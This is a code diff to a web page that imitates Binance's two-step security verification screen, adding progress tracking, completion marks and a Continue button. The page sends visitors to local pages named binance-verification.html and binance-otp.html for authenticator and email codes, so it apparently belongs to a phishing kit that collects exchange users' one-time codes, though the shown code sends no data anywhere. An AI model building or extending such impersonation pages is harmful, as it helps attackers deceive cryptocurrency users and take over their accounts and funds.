@@ -253,6 +253,40 @@
             }
         }
 
+        .verification-status {
+            font-size: 12px;
+            color: #28a745;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+
+        .verification-item.completed {
+            background-color: rgba(40, 167, 69, 0.1);
+            border-color: #28a745;
+        }
+
+        .verification-item.completed .verification-text {
+            color: #28a745;
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #fcd535;
+            border: none;
+            border-radius: 8px;
+            color: #000000;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 24px;
+            display: none;
+        }
+
+        .continue-button:hover {
+            background-color: #f0b90b;
+        }
+
         /* SVG Icons */
         .shield-icon {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23ffffff'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M12 15v2m-6 4h12a2 2 0 002-2v-9a2 2 0 00-2-2H6a2 2 0 00-2 2v9a2 2 0 002 2zm10-12V7a4 4 0 00-8 0v4h8z'/%3E%3C/svg%3E");
@@ -339,15 +373,16 @@
             
             <p class="description">You need to complete all of the following verifications to continue.</p>
             
-            <div class="progress">0/2</div>
+            <div class="progress" id="progress-counter">0/2</div>
 
             <div class="verification-options">
-                <div class="verification-item" onclick="showLoading(this, 'binance-verification.html')">
+                <div class="verification-item" id="authenticator-option" onclick="selectVerificationMethod('authenticator')">
                     <div class="button-content">
                         <span class="regular-content">
                             <div class="verification-item-content">
                                 <div class="verification-icon shield-icon"></div>
                                 <span class="verification-text">Authenticator App</span>
+                                <span class="verification-status" id="authenticator-status"></span>
                             </div>
                         </span>
                         <div class="loading-content">
@@ -362,12 +397,13 @@
                     </div>
                 </div>
 
-                <div class="verification-item" onclick="showLoading(this, 'binance-otp.html')">
+                <div class="verification-item" id="email-option" onclick="selectVerificationMethod('email')">
                     <div class="button-content">
                         <span class="regular-content">
                             <div class="verification-item-content">
                                 <div class="verification-icon email-icon"></div>
                                 <span class="verification-text">Email</span>
+                                <span class="verification-status" id="email-status"></span>
                             </div>
                         </span>
                         <div class="loading-content">
@@ -382,6 +418,10 @@
                     </div>
                 </div>
             </div>
+
+            <button class="continue-button" id="continue-button" onclick="proceedToNextStep()">
+                Continue
+            </button>
 
             <div class="additional-options">
                 <a href="#" class="passkey-option">Use Passkeys to Complete Verification</a>
@@ -401,6 +441,114 @@
     </footer>
 
     <script>
+        // Verification progress tracking
+        let completedSteps = [];
+        
+        // Initialize page on load
+        window.addEventListener('load', function() {
+            loadVerificationProgress();
+            updateProgressDisplay();
+        });
+
+        function loadVerificationProgress() {
+            // Load completed steps from localStorage
+            const saved = localStorage.getItem('binance_verification_progress');
+            if (saved) {
+                completedSteps = JSON.parse(saved);
+            }
+            
+            // Update UI based on completed steps
+            completedSteps.forEach(step => {
+                markStepCompleted(step);
+            });
+        }
+
+        function saveVerificationProgress() {
+            localStorage.setItem('binance_verification_progress', JSON.stringify(completedSteps));
+        }
+
+        function markStepCompleted(stepType) {
+            if (!completedSteps.includes(stepType)) {
+                completedSteps.push(stepType);
+                saveVerificationProgress();
+            }
+            
+            // Update UI
+            const option = document.getElementById(stepType + '-option');
+            const status = document.getElementById(stepType + '-status');
+            
+            if (option && status) {
+                option.classList.add('completed');
+                status.textContent = '✓ Completed';
+                status.style.color = '#28a745';
+            }
+            
+            updateProgressDisplay();
+        }
+
+        function updateProgressDisplay() {
+            const progressElement = document.getElementById('progress-counter');
+            const continueButton = document.getElementById('continue-button');
+            
+            progressElement.textContent = `${completedSteps.length}/2`;
+            
+            // Show continue button when both steps are completed
+            if (completedSteps.length >= 2) {
+                continueButton.style.display = 'block';
+            }
+        }
+
+        function selectVerificationMethod(type) {
+            // Check if this step is already completed
+            if (completedSteps.includes(type)) {
+                return; // Don't allow re-verification
+            }
+            
+            // Store the current verification type for return navigation
+            localStorage.setItem('binance_current_verification', type);
+            
+            // Show loading and redirect
+            const button = document.getElementById(type + '-option');
+            showLoading(button, getRedirectUrl(type));
+        }
+
+        function getRedirectUrl(type) {
+            if (type === 'authenticator') {
+                return 'binance-verification.html';
+            } else if (type === 'email') {
+                return 'binance-otp.html';
+            }
+            return '#';
+        }
+
+        function proceedToNextStep() {
+            // Clear verification progress as user is moving to next phase
+            localStorage.removeItem('binance_verification_progress');
+            localStorage.removeItem('binance_current_verification');
+            
+            // Redirect to success page or next step
+            window.location.href = 'success.html'; // or wherever they should go next
+        }
+
+        // Function to be called when returning from verification pages
+        function completeCurrentVerification() {
+            const currentType = localStorage.getItem('binance_current_verification');
+            if (currentType) {
+                markStepCompleted(currentType);
+                localStorage.removeItem('binance_current_verification');
+            }
+        }
+
+        // Check if we're returning from a verification page
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('completed')) {
+            const completedType = urlParams.get('completed');
+            markStepCompleted(completedType);
+            
+            // Clean up URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+
         function showLoading(button, redirectUrl) {
             const buttonContent = button.querySelector('.button-content');
             buttonContent.classList.add('loading');
